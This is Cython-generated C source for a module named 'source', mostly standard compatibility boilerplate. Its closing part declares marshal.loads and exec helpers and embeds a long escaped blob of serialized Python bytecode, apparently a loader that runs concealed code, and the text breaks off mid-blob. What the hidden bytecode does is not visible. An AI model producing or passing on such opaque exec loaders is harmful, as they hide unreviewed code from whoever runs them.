  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l[] = "c\000\000\000\000\000\000\000\000\000\000\000\000\025\000\000\000\000\000\000\000\363\374\007\000\000\227\000d\000d\001l\000Z\000d\000d\001l\001Z\001d\000d\001l\002Z\002d\000d\001l\003Z\003d\000d\002l\004m\005Z\005\001\000d\000d\003l\002m\006Z\006\001\000d\004\204\000Z\007e\005j\010\000\000\000\000\000\000\000\000e\005j\t\000\000\000\000\000\000\000\000e\005j\n\000\000\000\000\000\000\000\000e\005j\013\000\000\000\000\000\000\000\000e\005j\014\000\000\000\000\000\000\000\000e\005j\r\000\000\000\000\000\000\000\000g\006Z\016d\005Z\017e\003j\020\000\000\000\000\000\000\000\000\240\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e\017\246\001\000\000\253\001\000\000\000\000\000\000\000\000rc\002\000e\022e\017d\006\246\002\000\000\253\002\000\000\000\000\000\000\000\0005\000Z\023\t\000\002\000e\024e\023\240\025\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\240\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\027n\r#\000e\030$\000r\005\001\000d\000Z\027Y\000n\004w\000x\003Y\000w\001d\001d\001d\001\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000n\013#\0001\000s\004w\002x\003Y\000w\001\001\000Y\000\001\000\001\000n\002d\000Z\027e\027d\007z\000\000\000\002\000e\031e\016\246\001\000\000\253\001\000\000\000\000\000\000\000\000z\006\000\000Z\032e\016e\032\031\000\000\000\000\000\000\000\000\000Z\033\002\000e\022e\017d\010\246\002\000\000\253\002\000\000\000\000\000\000\000\0005\000Z\023e\023\240\034\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000e\035e\032\246\001\000\000\253\001\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\001d\001d\001\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000n""\013#\0001\000s\004w\002x\003Y\000w\001\001\000Y\000\001\000\001\000d\tZ\036\002\000e\007e\036e\033\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000\002\000e\037e\033d\nz\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\000d\001l Z 